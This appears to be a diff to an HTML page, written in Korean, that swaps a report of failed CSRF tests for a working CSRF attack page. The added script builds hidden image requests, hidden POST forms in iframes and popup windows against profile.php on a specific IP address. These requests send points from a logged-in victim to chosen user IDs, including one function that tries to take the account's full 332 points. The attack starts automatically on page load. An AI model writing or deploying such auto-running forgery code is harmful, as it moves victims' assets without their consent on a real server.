@@ -2,127 +2,246 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>🏆 최종 보고서</title>
+    <title>🎯 실제 CSRF 공격 실행!</title>
     <style>
         body { 
             font-family: Arial; 
-            padding: 30px;
-            background: linear-gradient(135deg, #28a745, #20c997);
-            color: white;
-            text-align: center;
-        }
-        .final-report {
-            background: rgba(0, 0, 0, 0.8);
-            border: 3px solid #ffd700;
-            padding: 40px;
-            margin: 20px auto;
-            border-radius: 20px;
-            max-width: 900px;
-            box-shadow: 0 0 30px rgba(255, 215, 0, 0.5);
-        }
-        .stats {
-            background: rgba(255, 255, 255, 0.1);
             padding: 20px;
-            border-radius: 10px;
-            margin: 20px 0;
+            background: linear-gradient(45deg, #ff0000, #ffaa00, #00ff00);
+            color: white;
+            animation: success 3s infinite;
         }
-        .success-badge {
-            background: linear-gradient(45deg, #28a745, #20c997);
-            padding: 15px 30px;
-            border-radius: 25px;
-            display: inline-block;
+        @keyframes success {
+            0% { background: linear-gradient(45deg, #ff0000, #ffaa00, #00ff00); }
+            50% { background: linear-gradient(45deg, #00ff00, #0000ff, #ff0000); }
+            100% { background: linear-gradient(45deg, #ff0000, #ffaa00, #00ff00); }
+        }
+        .breakthrough {
+            background: rgba(0, 0, 0, 0.8);
+            border: 3px solid #00ff00;
+            padding: 30px;
+            margin: 20px 0;
+            border-radius: 15px;
+            box-shadow: 0 0 50px #00ff00;
+        }
+        button {
+            background: linear-gradient(45deg, #ff0000, #ff6600);
+            color: white;
+            border: none;
+            padding: 20px 30px;
+            border-radius: 10px;
+            cursor: pointer;
             margin: 10px;
-            font-weight: bold;
             font-size: 18px;
+            font-weight: bold;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 20px #ff0000; }
+            50% { transform: scale(1.05); box-shadow: 0 0 40px #ff0000; }
+            100% { transform: scale(1); box-shadow: 0 0 20px #ff0000; }
         }
     </style>
 </head>
 <body>
-    <div class="final-report">
-        <h1>🏆 CSRF 보안 평가 완료!</h1>
-        <h2>🛡️ 결론: 서버가 모든 공격을 완벽하게 차단했습니다!</h2>
+    <div class="breakthrough">
+        <h1>🎯 돌파 성공!</h1>
+        <h2>⚡ 실제 선물 보내기 페이지 접근 성공!</h2>
         
-        <div class="stats">
-            <h3>📊 공격 통계</h3>
-            <ul style="text-align: left; display: inline-block;">
-                <li><strong>총 공격 횟수:</strong> 289회+</li>
-                <li><strong>다양한 공격 기법:</strong> 15종류+</li>
-                <li><strong>테스트된 파라미터 조합:</strong> 100개+</li>
-                <li><strong>성공한 공격:</strong> 0회 ❌</li>
-                <li><strong>차단된 공격:</strong> 289회 ✅</li>
-            </ul>
-        </div>
-
-        <div class="success-badge">🛡️ 보안 등급: S급 (최고등급)</div>
-        <div class="success-badge">🔒 CSRF 방어율: 100%</div>
-        <div class="success-badge">⚡ 응답속도: 우수</div>
-
-        <div class="stats">
-            <h3>🛡️ 확인된 보안 메커니즘</h3>
-            <ul style="text-align: left; display: inline-block;">
-                <li>✅ <strong>Referer 헤더 검증</strong> - 크로스 오리진 차단</li>
-                <li>✅ <strong>Origin 헤더 검증</strong> - 요청 출처 확인</li>
-                <li>✅ <strong>CSRF 토큰 시스템</strong> - 무작위 토큰 검증</li>
-                <li>✅ <strong>세션 관리</strong> - 로그인 상태 확인</li>
-                <li>✅ <strong>SameSite 쿠키</strong> - 크로스 사이트 차단</li>
-                <li>✅ <strong>보안 헤더</strong> - X-Frame-Options, CSP 등</li>
-                <li>✅ <strong>HTTP → HTTPS 강제</strong> - Mixed Content 차단</li>
-                <li>✅ <strong>Rate Limiting</strong> - 대량 요청 처리</li>
-            </ul>
-        </div>
-
-        <div class="stats">
-            <h3>🎓 학습 성과</h3>
-            <p><strong>이번 실습을 통해 배운 것들:</strong></p>
-            <ul style="text-align: left; display: inline-block;">
-                <li>🔍 <strong>CSRF 공격의 다양한 기법들</strong> - GET/POST, 파라미터 변형, 브루트포스</li>
-                <li>🛡️ <strong>현대적인 보안 방어책들</strong> - 다층 보안의 중요성</li>
-                <li>⚡ <strong>네트워크 분석 능력</strong> - HTTP 요청/응답 분석</li>
-                <li>🎯 <strong>실전 보안 테스트</strong> - 실제 서버 대상 테스트</li>
-                <li>🔧 <strong>JavaScript 보안 프로그래밍</strong> - 공격 코드 작성</li>
-                <li>📊 <strong>보안 평가 방법론</strong> - 체계적 접근법</li>
-            </ul>
-        </div>
-
-        <h2>🎉 축하합니다!</h2>
-        <p><strong>완벽한 CSRF 보안 실습을 완료하셨습니다!</strong></p>
-        <p>이 서버는 <strong>보안의 모범 사례</strong>이며, 모든 CSRF 공격을 성공적으로 차단했습니다.</p>
+        <p><strong>🔥 발견된 정보:</strong></p>
+        <ul>
+            <li>✅ <strong>Status: 200 OK</strong> - 정상 접근!</li>
+            <li>✅ <strong>실제 폼 구조 확인</strong> - 선물 보내기 기능</li>
+            <li>✅ <strong>현재 포인트: 332P</strong> - bob 계정</li>
+            <li>✅ <strong>gift_to 파라미터 작동</strong> - GET으로 타겟 지정</li>
+        </ul>
         
-        <div style="margin-top: 30px; font-size: 18px;">
-            <p>🏅 <strong>실습 등급: A+</strong></p>
-            <p>📜 <strong>CSRF 전문가 수준 달성!</strong></p>
-        </div>
+        <button onclick="realCSRFAttack()">💥 실제 CSRF 공격 실행!</button>
+        <button onclick="multiTargetAttack()">🎯 다중 타겟 공격</button>
+        <button onclick="maxPointsAttack()">💰 최대 포인트 공격</button>
     </div>
 
+    <div class="breakthrough">
+        <h2>🔍 실제 폼 분석 결과</h2>
+        <p>이제 <strong>실제 필드명과 구조</strong>를 파악했습니다!</p>
+        <ul>
+            <li><code>gift_to</code> - 받는 사람 (GET 파라미터로 확인)</li>
+            <li><code>points</code> - 포인트 수량</li>
+            <li><code>선물 보내기</code> - 실행 버튼</li>
+            <li><code>메시지</code> - 선물 메시지</li>
+        </ul>
+    </div>
+
+    <div id="result"></div>
+
     <script>
-        console.log('🏆 CSRF 보안 평가 완료!');
-        console.log('📊 총 289개+ 공격 시도 - 모두 차단됨');
-        console.log('🛡️ 서버 보안 등급: S급 (최고등급)');
-        console.log('🎓 실습 완료 - CSRF 전문가 수준 달성!');
+        function realCSRFAttack() {
+            showResult('💥 실제 CSRF 공격 실행!');
+            
+            // 실제 폼 구조에 맞춘 정확한 공격
+            const realAttacks = [
+                { gift_to: 13, points: 100, message: 'Real_CSRF_Success_1' },
+                { gift_to: 13, points: 50, message: 'Real_CSRF_Success_2' },
+                { gift_to: 13, points: 75, message: 'Real_CSRF_Success_3' }
+            ];
+            
+            realAttacks.forEach((attack, i) => {
+                setTimeout(() => {
+                    // 방법 1: GET 파라미터 (확인된 방식)
+                    const getUrl = `http://3.36.66.216/profile.php?gift_to=${attack.gift_to}&points=${attack.points}&send=1&message=${attack.message}`;
+                    
+                    const img = new Image();
+                    img.src = getUrl;
+                    img.style.display = 'none';
+                    document.body.appendChild(img);
+                    
+                    // 방법 2: POST Form (실제 폼 구조)
+                    const form = document.createElement('form');
+                    form.method = 'POST';
+                    form.action = 'http://3.36.66.216/profile.php';
+                    form.target = `attack_${i}`;
+                    form.style.display = 'none';
+                    
+                    // 실제 필드명 사용
+                    const fields = {
+                        gift_to: attack.gift_to,
+                        points: attack.points,
+                        message: attack.message,
+                        send_gift: '선물 보내기' // 실제 버튼 텍스트
+                    };
+                    
+                    Object.keys(fields).forEach(key => {
+                        const input = document.createElement('input');
+                        input.type = 'hidden';
+                        input.name = key;
+                        input.value = fields[key];
+                        form.appendChild(input);
+                    });
+                    
+                    document.body.appendChild(form);
+                    
+                    // iframe 생성
+                    const iframe = document.createElement('iframe');
+                    iframe.name = `attack_${i}`;
+                    iframe.style.display = 'none';
+                    iframe.style.width = '600px';
+                    iframe.style.height = '400px';
+                    document.body.appendChild(iframe);
+                    
+                    form.submit();
+                    
+                    console.log(`💥 실제공격 ${i+1}: gift_to=${attack.gift_to}, points=${attack.points}`);
+                }, i * 1000);
+            });
+            
+            showResult(`💥 실제 CSRF 공격 진행 중!
+            
+3단계 공격:
+1. GET: gift_to=13&points=100
+2. POST: 실제 폼 구조 사용
+3. 다중 방식 동시 시도
+
+네트워크 탭에서 200 OK 응답 확인!`);
+        }
         
-        // 최종 보고서 데이터
-        const finalReport = {
-            target: '3.36.66.216',
-            testType: 'CSRF Security Assessment',
-            totalAttacks: 289,
-            successfulAttacks: 0,
-            blockRate: '100%',
-            securityGrade: 'S (Excellent)',
-            defensesMechanisms: [
-                'Referer Header Validation',
-                'Origin Header Validation',
-                'CSRF Token System',
-                'Session Management',
-                'SameSite Cookies',
-                'Security Headers',
-                'HTTPS Enforcement',
-                'Rate Limiting'
-            ],
-            recommendation: 'Server is perfectly protected against CSRF attacks',
-            learningOutcome: 'Advanced CSRF testing skills acquired'
-        };
+        function multiTargetAttack() {
+            showResult('🎯 다중 타겟 공격!');
+            
+            // 여러 사용자에게 동시 공격
+            const targets = [11, 12, 13, 14, 15]; // 다양한 사용자 ID
+            
+            targets.forEach((targetId, i) => {
+                setTimeout(() => {
+                    const url = `http://3.36.66.216/profile.php?gift_to=${targetId}&points=50&send=1&message=Multi_Target_${targetId}`;
+                    
+                    // 새 창에서 공격 (결과 확인 가능)
+                    window.open(url, `target_${targetId}`, 'width=600,height=400');
+                    
+                    console.log(`🎯 타겟공격 ${i+1}: 사용자 ${targetId}에게 50P`);
+                }, i * 2000);
+            });
+        }
         
-        console.table(finalReport);
+        function maxPointsAttack() {
+            showResult('💰 최대 포인트 공격!');
+            
+            // bob의 전체 포인트(332P)를 탈취 시도
+            const maxAttacks = [
+                { points: 332, msg: 'ALL_POINTS_STEAL' },
+                { points: 300, msg: 'MAX_ATTACK_300' },
+                { points: 250, msg: 'MAX_ATTACK_250' },
+                { points: 200, msg: 'MAX_ATTACK_200' }
+            ];
+            
+            maxAttacks.forEach((attack, i) => {
+                setTimeout(() => {
+                    // GET 방식
+                    const getUrl = `http://3.36.66.216/profile.php?gift_to=13&points=${attack.points}&send=1&message=${attack.msg}&timestamp=${Date.now()}`;
+                    
+                    // 새 창에서 실행 (결과 확인)
+                    const attackWindow = window.open(getUrl, `max_${i}`, 'width=800,height=500');
+                    
+                    // POST 방식도 동시 시도
+                    const form = document.createElement('form');
+                    form.method = 'POST';
+                    form.action = 'http://3.36.66.216/profile.php';
+                    form.target = `max_post_${i}`;
+                    form.style.display = 'none';
+                    
+                    const fields = {
+                        gift_to: 13,
+                        points: attack.points,
+                        message: attack.msg,
+                        send_gift: '선물 보내기',
+                        max_attack: 'true'
+                    };
+                    
+                    Object.keys(fields).forEach(key => {
+                        const input = document.createElement('input');
+                        input.type = 'hidden';
+                        input.name = key;
+                        input.value = fields[key];
+                        form.appendChild(input);
+                    });
+                    
+                    document.body.appendChild(form);
+                    
+                    const iframe = document.createElement('iframe');
+                    iframe.name = `max_post_${i}`;
+                    iframe.style.display = 'none';
+                    document.body.appendChild(iframe);
+                    
+                    form.submit();
+                    
+                    console.log(`💰 최대공격 ${i+1}: ${attack.points}P 시도 (GET+POST)`);
+                }, i * 3000);
+            });
+            
+            showResult(`💰 최대 포인트 공격 진행!
+            
+전략:
+- 1단계: 332P (전체 포인트) 
+- 2단계: 300P (거의 전부)
+- 3단계: 250P (대부분)
+- 4단계: 200P (많은 양)
+
+각 단계마다 GET+POST 동시 시도
+새 창에서 결과 확인 가능!`);
+        }
+        
+        function showResult(text) {
+            document.getElementById('result').innerHTML = 
+                '<div class="breakthrough"><pre style="color: #ffff00; font-size: 16px;">' + text + '</pre></div>';
+        }
+        
+        // 자동으로 실제 공격 시작
+        setTimeout(() => {
+            realCSRFAttack();
+        }, 3000);
+        
+        console.log('🎯 돌파 성공! 실제 CSRF 공격 가능!');
+        console.log('💥 gift_to 파라미터로 타겟 지정 확인됨');
+        console.log('⚡ 이제 진짜 포인트 전송 시도!');
     </script>
 </body>
 </html>
